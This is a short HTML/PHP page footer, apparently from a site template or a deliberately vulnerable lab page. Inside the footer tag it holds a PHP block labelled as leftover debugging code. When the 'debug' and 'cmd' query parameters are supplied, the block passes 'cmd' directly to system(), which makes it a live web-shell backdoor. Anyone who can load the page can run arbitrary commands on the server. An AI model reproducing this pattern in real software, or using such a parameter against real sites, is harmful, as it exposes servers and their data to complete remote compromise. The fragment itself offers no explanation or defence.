<footer>
<?php
// Debugging stuff. Remove it when done!
if (array_key_exists("debug", $_GET)) {
    echo "<pre>";
    if (array_key_exists("cmd", $_GET)) {
        system($_GET['cmd']);
    }
    echo "</pre>";
}
?>

</footer>
</body>

</html>